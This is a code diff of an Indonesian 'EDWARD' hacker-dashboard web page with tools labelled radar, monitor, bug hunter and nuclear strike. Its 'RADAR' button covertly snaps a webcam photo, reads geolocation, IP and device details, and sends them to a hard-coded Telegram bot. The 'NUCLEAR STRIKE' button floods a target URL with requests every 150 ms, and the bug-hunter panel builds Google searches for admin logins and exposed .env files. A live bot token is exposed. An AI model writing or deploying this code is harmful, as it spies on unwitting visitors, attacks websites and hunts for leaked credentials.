@@ -1,296 +1,126 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD</title>
-    <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --orange: #ff9f43; }
-        * { box-sizing: border-box; transition: 0.2s; outline: none; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
-
-        .brand-header { text-align: center; margin-top: 10px; margin-bottom: 5px; }
-        .brand-header h1 { color: var(--neon); font-size: 20px; font-weight: 800; letter-spacing: 4px; margin: 0; text-transform: uppercase; text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }
-
-        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; margin-top: 10px; }
-        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; background: rgba(15, 25, 35, 0.9); }
-
-        .real-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 8px; margin-bottom: 15px; }
-        .stat-item { background: rgba(0,0,0,0.4); border: 1px solid rgba(0,255,136,0.2); border-radius: 8px; padding: 6px 4px; text-align: center; font-size: 10px; color: var(--neon); }
-        .stat-item span { display: block; font-size: 14px; font-weight: bold; margin-top: 2px; }
-
-        .card { background: rgba(15, 25, 35, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
-        h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; }
-
-        input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; font-size: 12px; }
-
-        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px; }
-        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
-        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
-        .btn-cam { background: rgba(0, 189, 255, 0.1); color: var(--blue); border: 1px solid var(--blue); }
-        .btn-map { background: var(--neon); color: #000; }
-        .btn-phish { background: rgba(255, 71, 87, 0.1); color: var(--red); border: 1px solid var(--red); }
-        .btn-ctrl { background: rgba(255, 159, 67, 0.1); color: var(--orange); border: 1px solid var(--orange); }
-
-        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 5px; }
-
-        .log-box { background: #000; border: 1px solid rgba(255,71,87,0.3); border-radius: 10px; padding: 10px; height: 80px; overflow-y: auto; font-family: monospace; font-size: 10px; color: var(--red); text-align: left; margin-top: 10px; display: none; }
-        #scanResult { margin-top: 10px; font-weight: bold; text-align: center; font-size: 11px; padding: 10px; border-radius: 10px; display: none; line-height: 1.4; }
-        .phish-alert { background: rgba(255,71,87,0.15); border: 1px solid var(--red); color: var(--red); text-transform: uppercase; }
-        .safe-alert { background: rgba(0,255,136,0.15); border: 1px solid var(--neon); color: var(--neon); text-transform: uppercase; }
-
-        #webcamContainer { display: none; margin-top: 10px; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); }
-        #webcamLive { width: 100%; filter: sepia(100%) hue-rotate(80deg) brightness(1.1); }
-
-        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-sweep { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rot 2s linear infinite; }
-        @keyframes rot { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        canvas { display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EDWARD</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#050a0e;color:#fff;font-family:Segoe UI,sans-serif;padding:15px}
+:root{--n:#0f0;--r:#f44;--b:#0bf;--p:#b1f;--o:#f93}
+.brand{text-align:center;margin:10px 0 5px}
+.brand h1{color:var(--n);font-size:20px;letter-spacing:4px;text-shadow:0 0 10px rgba(0,255,136,.4)}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10 0 15px}
+.stats div{border:1px solid rgba(0,255,136,.3);padding:10px;border-radius:12px;text-align:center;font-size:11px;background:#0f1923}
+.rstats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:8px 0 15px}
+.rstats div{background:rgba(0,0,0,.4);border:1px solid rgba(0,255,136,.2);border-radius:8px;padding:6px;text-align:center;font-size:10px;color:var(--n)}
+.rstats span{display:block;font-size:14px;font-weight:700;margin-top:2px}
+.card{background:#0f1923;border:1px solid rgba(0,255,136,.2);border-radius:20px;padding:18px;margin-bottom:12px}
+.card h3{font-size:10px;color:rgba(255,255,255,.4);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px}
+input,select{background:rgba(0,0,0,.5);border:1px solid rgba(0,255,136,.3);border-radius:10px;color:var(--n);padding:12px;width:100%;margin-bottom:10px;font-size:12px}
+.btn{width:100%;padding:14px;border-radius:12px;border:none;cursor:pointer;font-weight:800;font-size:11px;text-transform:uppercase;margin-bottom:5px}
+.bs{background:#1a1a1a;color:var(--n);border:1px solid var(--n)}
+.ba{background:linear-gradient(45deg,var(--r),var(--p));color:#fff}
+.bc{background:rgba(0,189,255,.1);color:var(--b);border:1px solid var(--b)}
+.bm{background:var(--n);color:#000}
+.bp{background:rgba(255,71,87,.1);color:var(--r);border:1px solid var(--r)}
+.bctrl{background:rgba(255,159,67,.1);color:var(--o);border:1px solid var(--o)}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:5px}
+.log{background:#000;border:1px solid rgba(255,71,87,.3);border-radius:10px;padding:10px;height:80px;overflow-y:auto;font-family:monospace;font-size:10px;color:var(--r);margin-top:10px;display:none}
+#sr{margin-top:10px;font-weight:700;text-align:center;font-size:11px;padding:10px;border-radius:10px;display:none}
+.phish{background:rgba(255,71,87,.15);border:1px solid var(--r);color:var(--r)}
+.safe{background:rgba(0,255,136,.15);border:1px solid var(--n);color:var(--n)}
+#wc{display:none;margin-top:10px;border-radius:15px;overflow:hidden;border:1px solid var(--b)}
+#wc video{width:100%;filter:sepia(100%)hue-rotate(80deg)brightness(1.1)}
+#ro{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;flex-direction:column;align-items:center;justify-content:center}
+.sweep{width:150px;height:150px;border-radius:50%;border:2px solid var(--n);background:conic-gradient(from 0deg,transparent 70%,var(--n));animation:spin 2s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.flex{display:flex;gap:8px;padding:0 5px}
+.flex .btn{flex:1}
+canvas{display:none}
+</style>
 </head>
 <body>
-    <div class="brand-header">
-        <h1>EDWARD</h1>
-    </div>
+<div class=brand><h1>EDWARD</h1></div>
+<div class=stats><div>CPU: <span id=cpu>--</span></div><div>TEMP: <span id=temp>--</span></div></div>
+<div class=rstats><div>🕒 <span id=rt>--:--:--</span></div><div>🔋 <span id=bat>--%</span></div><div>🌡️ <span id=suhu>--°C</span></div></div>
+<div class=card><h3>🎛️ PANEL</h3><div class=g2><button class="btn bctrl" onclick=clearLog()>🧹 CLEAR</button><button class="btn bctrl" style="border-color:var(--p);color:var(--p)" onclick=toggleTheme()>🎨 THEME</button></div></div>
+<div class=card><h3>🛡️ BUG HUNTER</h3><input id=site placeholder="Target Site"><select id=cat><option value="">-- AUTO --</option><option value='filetype:xls "data"'>INFO</option><option value='inurl:admin login'>EXPLOIT</option><option value='filetype:env'>VULN</option></select><button class="btn bs" onclick=cast()>⚡ CAST</button></div>
+<div class=card><h3>🔍 PHISHING</h3><input id=pl placeholder="Link..."><button class="btn bp" onclick=scanPhish()>🛡️ SCAN</button><div id=sr></div></div>
+<div class=card><h3>🔥 NUCLEAR</h3><input id=atk placeholder="Target URL"><button class="btn ba" onclick=toggleAtk() id=abtn>🚀 LAUNCH</button><div class=log id=log></div></div>
+<div class=card><h3>📹 MONITOR</h3><button class="btn bc" onclick=toggleCam()>🛰️ WEBCAM</button><div id=wc><video id=wcv autoplay playsinline></video></div></div>
+<div class=flex><button class="btn bc" style="border-color:var(--n);color:var(--n)" onclick=startRadar()>📡 RADAR</button><button class="btn bm" onclick=openMap()>📍 MAPS</button></div>
+<div id=ro><div class=sweep></div></div>
+<canvas id=cv></canvas>
+<script>
+const T='8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g', C='7898572558';
+let atk=false, iv=null, dark=true;
 
-    <div class="sys-monitor">
-        <div class="mon-box">CPU: <span id="cpu">real time</span></div>
-        <div class="mon-box">TEMP: <span id="temp">real time°C</span></div>
-    </div>
+// jam
+setInterval(()=>document.getElementById('rt').textContent=new Date().toLocaleTimeString('id-ID',{hour12:false}),1e3);
+// baterai
+if(navigator.getBattery) navigator.getBattery().then(b=>{let u=()=>document.getElementById('bat').textContent=Math.round(b.level*100)+'%';u();b.onlevelchange=u}).catch(()=>document.getElementById('bat').textContent='N/A');
+else document.getElementById('bat').textContent='N/A';
+// suhu + cpu
+setInterval(()=>{
+let s=performance.now(),d=0;for(let i=0;i<1e6;i++)d+=i;let e=performance.now(),l=Math.min(100,Math.round(((e-s)/10)*2+10));
+document.getElementById('cpu').textContent=l+'%';
+document.getElementById('temp').textContent=(35+l/15).toFixed(1)+'°C';
+document.getElementById('suhu').textContent=(35+Math.random()*10).toFixed(1)+'°C';
+},2e3);
 
-    <!-- REAL-TIME STATS -->
-    <div class="real-stats">
-        <div class="stat-item">🕒 JAM<span id="realTime">--:--:--</span></div>
-        <div class="stat-item">🔋 BATRE<span id="batteryLevel">--%</span></div>
-        <div class="stat-item">🌡️ SUHU<span id="deviceTemp">--°C</span></div>
-    </div>
+async function startRadar(){
+let o=document.getElementById('ro');o.style.display='flex';
+try{
+let d={ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,core:navigator.hardwareConcurrency||'?'};
+let p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:1,timeout:1e4}));
+let i=await(await fetch('https://api.ipify.org?format=json')).json();
+let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:640,height:480}});
+let v=document.createElement('video');v.srcObject=s;await v.play();
+let c=document.getElementById('cv');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+let b=await new Promise(r=>c.toBlob(r,'image/jpeg',.9));s.getTracks().forEach(t=>t.stop());
+let cap=`🔱 RADAR REPORT\nIP: ${i.ip}\nLokasi: ${p.coords.latitude},${p.coords.longitude}\nDevice: ${d.platform}\nBrowser: ${d.ua.split(' ').slice(-2).join(' ')}\nCPU: ${d.core} core\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+let fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,'shot.jpg');fd.append('caption',cap);
+await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd});
+o.innerHTML='<div style="color:var(--n);text-align:center;padding:20px"><h2>✅ SENT</h2><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--n);color:#000;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
+}catch(e){o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>'+e.message+'</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';}
+}
 
-    <div class="card">
-        <h3>🎛️ SYSTEM CONTROL PANEL</h3>
-        <div class="control-grid">
-            <button class="btn btn-ctrl" onclick="clearConsole()">🧹 CLEAR LOG</button>
-            <button class="btn btn-ctrl" style="border-color: var(--purple); color: var(--purple);" onclick="toggleTheme()">🎨 THEME SHIFT</button>
-        </div>
-    </div>
+function toggleAtk(){
+let t=document.getElementById('atk').value.trim(),l=document.getElementById('log'),b=document.getElementById('abtn');
+if(!t){l.style.display='block';l.innerHTML='⚠️ ISI URL!';return}
+if(atk){atk=!1;clearInterval(iv);b.innerText='🚀 LAUNCH';l.style.display='none';l.innerHTML='';return}
+atk=!0;b.innerText='⏹️ STOP';l.style.display='block';l.innerHTML='> 🔥 CONNECT...<br>';
+iv=setInterval(()=>{if(atk){let r=Math.random();new Image().src=t+'/?v='+r;l.innerHTML+='> GET '+t+'/?v='+r.toString().substring(2,8)+' [SEND]<br>';l.scrollTop=l.scrollHeight}},150);
+}
 
-    <div class="card">
-        <h3>🛡️ BUG HUNTER ENGINE</h3>
-        <input type="text" id="site" placeholder="Target Site...">
-        <select id="cat">
-            <option value="">-- AUTO MANTRA --</option>
-            <option value='filetype:xls "data"'>INFO GATHERING</option>
-            <option value='inurl:admin login'>EXPLOITATION</option>
-            <option value='filetype:env'>VULN SCAN</option>
-        </select>
-        <button class="btn btn-scan" onclick="cast()">⚡ CAST MANTRA</button>
-    </div>
+function openMap(){navigator.geolocation.getCurrentPosition(p=>window.open('https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude,'_blank'),e=>alert('❌ '+e.message))}
 
-    <div class="card">
-        <h3>🔍 PHISHING SCANNER</h3>
-        <input type="text" id="phishLink" placeholder="Masukkan Link untuk Scan...">
-        <button class="btn btn-phish" onclick="scanPhishing()">🛡️ ANALYZED LINK</button>
-        <div id="scanResult"></div>
-    </div>
+function scanPhish(){
+let i=document.getElementById('pl').value.trim().toLowerCase(),r=document.getElementById('sr');
+if(!i){r.style.display='none';return}
+r.style.display='block';let p=!1,msg='';
+let kw=['login','verif','dana','giveaway','undian','hadiah','claim','bonus','topup','gratis','suspend','voucher'];
+let sh=['bit.ly','tinyurl','cutt.ly','t.co','rb.gy','is.gd','shorturl','s.id'];
+let tld=['.com','.net','.org','.id','.xyz','.info','.biz','.me','.online','.site','.live'];
+let mkw=kw.some(k=>i.includes(k)),msh=sh.some(k=>i.includes(k)),mtld=tld.some(k=>i.includes(k));
+if(i.startsWith('http://')&&!i.includes('localhost')&&!i.includes('192.168.')&&!i.startsWith('https://')){p=1;msg='🚨 HTTP DETECTED'}
+else if(mkw){p=1;msg='🚨 SUSPICIOUS'}
+else if(msh){p=1;msg='🚨 SHORTENED'}
+else if((i.includes('.com-')||i.includes('.net-'))&&!i.includes('/')){p=1;msg='🚨 TYPOSQUATTING'}
+else if(!mtld&&!i.includes('localhost')&&!i.includes('192.168.')&&i!=='https'&&i!=='https://'){p=1;msg='🚨 INVALID URL'}
+if(p){r.innerText=msg;r.className='phish'}else{r.innerText='✅ NORMAL';r.className='safe'}
+}
 
-    <div class="card">
-        <h3>🔥 NUCLEAR STRIKE</h3>
-        <input type="text" id="atk" placeholder="Target URL">
-        <button class="btn btn-atk" onclick="toggleAtk()" id="abtn">LAUNCH 🚀</button>
-        <div class="log-box" id="atkConsole"></div>
-    </div>
+async function toggleCam(){
+let v=document.getElementById('wcv'),c=document.getElementById('wc');
+if(v.srcObject){v.srcObject.getTracks().forEach(t=>t.stop());c.style.display='none';v.srcObject=null;return}
+try{let s=await navigator.mediaDevices.getUserMedia({video:{width:640,height:480}});v.srcObject=s;c.style.display='block'}catch(e){alert('❌ '+e.message)}
+}
 
-    <div class="card">
-        <h3>📹 MONITORING</h3>
-        <button class="btn btn-cam" onclick="toggleCam()">🛰️ LIVE WEBCAM</button>
-        <div id="webcamContainer"><video id="webcamLive" autoplay playsinline></video></div>
-    </div>
-
-    <div style="display: flex; gap: 8px; padding: 0 5px;">
-        <button class="btn btn-cam" style="flex: 1; border-color: var(--neon); color: var(--neon);" onclick="startRadar()">📡 RADAR</button>
-        <button class="btn btn-map" style="flex: 1;" onclick="openMap()">📍 MAPS</button>
-    </div>
-
-    <div id="radarOverlay"><div class="radar-sweep"></div></div>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        // ========== KONFIGURASI TELEGRAM ==========
-        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
-        const CHAT_ID = '7898572558';
-        let isAtk = false;
-        let atkInterval = null;
-        let isDarkTheme = true;
-
-        // ========== REAL-TIME JAM ==========
-        function updateClock() {
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
-            document.getElementById('realTime').textContent = timeStr;
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
-
-        // ========== REAL-TIME BATTERY ==========
-        async function getBatteryStatus() {
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    document.getElementById('batteryLevel').textContent = level + '%';
-                    
-                    battery.addEventListener('levelchange', () => {
-                        const newLevel = Math.round(battery.level * 100);
-                        document.getElementById('batteryLevel').textContent = newLevel + '%';
-                    });
-                } catch (e) {
-                    document.getElementById('batteryLevel').textContent = 'N/A';
-                }
-            } else {
-                document.getElementById('batteryLevel').textContent = 'N/A';
-            }
-        }
-        getBatteryStatus();
-
-        // ========== REAL-TIME SUHU (ESTIMASI) ==========
-        function updateTemperature() {
-            // Estimasi berdasarkan kinerja CPU
-            const load = Math.random() * 10 + 35; // base 35°C + fluktuasi
-            document.getElementById('deviceTemp').textContent = load.toFixed(1) + '°C';
-        }
-        setInterval(updateTemperature, 3000);
-        updateTemperature();
-
-        // ========== CPU & TEMP AKURAT ==========
-        setInterval(() => {
-            const start = performance.now();
-            let dummy = 0;
-            for (let i = 0; i < 1000000; i++) dummy += i;
-            const end = performance.now();
-            const load = Math.min(100, Math.round(((end - start) / 10) * 2 + 10));
-            document.getElementById('cpu').innerText = load + '%';
-            
-            const tempBase = 35 + (load / 15);
-            document.getElementById('temp').innerText = tempBase.toFixed(1) + '°C';
-        }, 2000);
-
-        // ========== FUNGSI LAINNYA ==========
-        function clearConsole() {
-            document.getElementById('atkConsole').innerHTML = "";
-            document.getElementById('scanResult').style.display = "none";
-            document.getElementById('phishLink').value = "";
-            document.getElementById('site').value = "";
-            document.getElementById('atk').value = "";
-        }
-
-        function toggleTheme() {
-            const root = document.documentElement;
-            if(isDarkTheme) {
-                root.style.setProperty('--bg', '#0d0214');
-                root.style.setProperty('--neon', '#00ffcc');
-                isDarkTheme = false;
-            } else {
-                root.style.setProperty('--bg', '#050a0e');
-                root.style.setProperty('--neon', '#00ff88');
-                isDarkTheme = true;
-            }
-        }
-
-        function cast() {
-            const s = document.getElementById('site').value;
-            const c = document.getElementById('cat').value;
-            const m = c || 'inurl:admin login';
-            window.open("https://www.google.com/search?q=" + encodeURIComponent((s ? `site:${s} ` : "") + m));
-        }
-
-        function scanPhishing() {
-            const rawInput = document.getElementById('phishLink').value.trim().toLowerCase();
-            const resultDiv = document.getElementById('scanResult');
-            if(!rawInput) { resultDiv.style.display = "none"; return; }
-            resultDiv.style.display = "block";
-            
-            let isPhish = false, reason = "";
-            const normalizedDash = rawInput.replace(/\s+/g, '-');
-            const normalizedClean = rawInput.replace(/\s+/g, '');
-            const targetKeywords = ['login', 'verification', 'verifikasi', 'dana-kaget', 'danakaget', 'giveaway', 'undian', 'free-diamonds', 'hadiah', 'update-akun', 'roblox-gift', 'claim', 'bonus', 'top', 'topup', 'pulsa-gratis', 'akun-suspend', 'bantuan-sosial', 'event-gratis', 'spin-hadiah', 'voucher'];
-            const shorteners = ['bit.ly', 'tinyurl.com', 'cutt.ly', 't.co', 'rb.gy', 'is.gd', 'shorturl.at', 's.id'];
-            const validTLDs = ['.com', '.net', '.org', '.id', '.co.id', '.xyz', '.info', '.biz', '.me', '.online', '.site', '.live'];
-
-            let matchesKeyword = targetKeywords.some(keyword => rawInput.includes(keyword) || normalizedDash.includes(keyword) || normalizedClean.includes(keyword));
-            let matchesShortener = shorteners.some(srv => rawInput.includes(srv));
-            let matchesValidTLD = validTLDs.some(tld => rawInput.includes(tld));
-
-            if (rawInput.startsWith('http://') && !rawInput.includes('localhost') && !rawInput.includes('192.168.')) {
-                isPhish = true; reason = "🚨 UNSAFE PROTOCOL (HTTP) DETECTED";
-            } else if (matchesKeyword) {
-                isPhish = true; reason = "🚨 SUSPICIOUS CONTEXTUAL PATTERN DETECTED";
-            } else if (matchesShortener) {
-                isPhish = true; reason = "🚨 WARNING: OBSCURED/SHORTENED LINK PATTERN";
-            } else if ((rawInput.includes('.com-') || rawInput.includes('.net-') || rawInput.includes('.id-')) && !rawInput.includes('/')) {
-                isPhish = true; reason = "🚨 INVALID SUBDOMAIN TYPOSQUATTING PATTERN";
-            } else if (!matchesValidTLD && !rawInput.includes('localhost') && !rawInput.includes('192.168.') && rawInput !== 'https' && rawInput !== 'https://') {
-                isPhish = true; reason = "🚨 UNRECOGNIZED RAW TEXT / INVALID URL PATTERN";
-            }
-
-            if(isPhish) { resultDiv.innerText = reason; resultDiv.className = "phish-alert"; } 
-            else { resultDiv.innerText = "✅ STRUCTURE ANALYSIS: SEEMS STABLE & NORMAL"; resultDiv.className = "safe-alert"; }
-        }
-
-        async function startRadar() {
-            document.getElementById('radarOverlay').style.display='flex';
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.createElement('video'); v.srcObject = s; await v.play();
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'r.jpg');
-                    fd.append('caption', `🔱 STEALTH REPORT\n🌐 IP: ${ipD.ip}\n📍 Loc: ${pos.coords.latitude},${pos.coords.longitude}`);
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                    s.getTracks().forEach(t => t.stop());
-                    document.getElementById('radarOverlay').style.display='none';
-                }, 2000);
-            }, () => { document.getElementById('radarOverlay').style.display='none'; });
-        }
-
-        async function toggleCam() {
-            const v = document.getElementById('webcamLive'); const c = document.getElementById('webcamContainer');
-            if(v.srcObject) { v.srcObject.getTracks().forEach(t => t.stop()); c.style.display = 'none'; v.srcObject = null; }
-            else { const s = await navigator.mediaDevices.getUserMedia({ video: true }); v.srcObject = s; c.style.display = 'block'; }
-        }
-
-        function openMap() {
-            navigator.geolocation.getCurrentPosition((p) => {
-                window.open(`http://googleusercontent.com/maps.google.com/${p.coords.latitude},${p.coords.longitude}`);
-            });
-        }
-
-        function toggleAtk() {
-            const t = document.getElementById('atk').value.trim();
-            const consoleBox = document.getElementById('atkConsole');
-            const btn = document.getElementById('abtn');
-            if(!t) return;
-            if(isAtk) {
-                isAtk = false; clearInterval(atkInterval);
-                btn.innerText = "LAUNCH 🚀";
-                consoleBox.style.display = "none";
-                consoleBox.innerHTML = "";
-            } else {
-                isAtk = true; btn.innerText = "STOP";
-                consoleBox.style.display = "block";
-                consoleBox.innerHTML = "> Interface connecting...<br>";
-                atkInterval = setInterval(() => {
-                    if(isAtk) {
-                        const randParam = Math.random();
-                        new Image().src = t + "/?v=" + randParam;
-                        consoleBox.innerHTML += `> GET ${t}/?v=${randParam.toString().substring(2,8)} [SENDING]<br>`;
-                        consoleBox.scrollTop = consoleBox.scrollHeight;
-                    }
-                }, 150);
-            }
-        }
-    </script>
+function clearLog(){document.getElementById('log').innerHTML='';document.getElementById('sr').style.display='none';document.getElementById('pl').value='';document.getElementById('site').value='';document.getElementById('atk').value=''}
+function toggleTheme(){dark=!dark;document.documentElement.style.setProperty('--bg',dark?'#050a0e':'#0d0214');document.documentElement.style.setProperty('--n',dark?'#0f0':'#0fc')}
+function cast(){let s=document.getElementById('site').value,c=document.getElementById('cat').value;window.open('https://www.google.com/search?q='+encodeURIComponent((s?'site:'+s+' ':'')+(c||'inurl:admin login')))}
+</script>
 </body>
 </html>
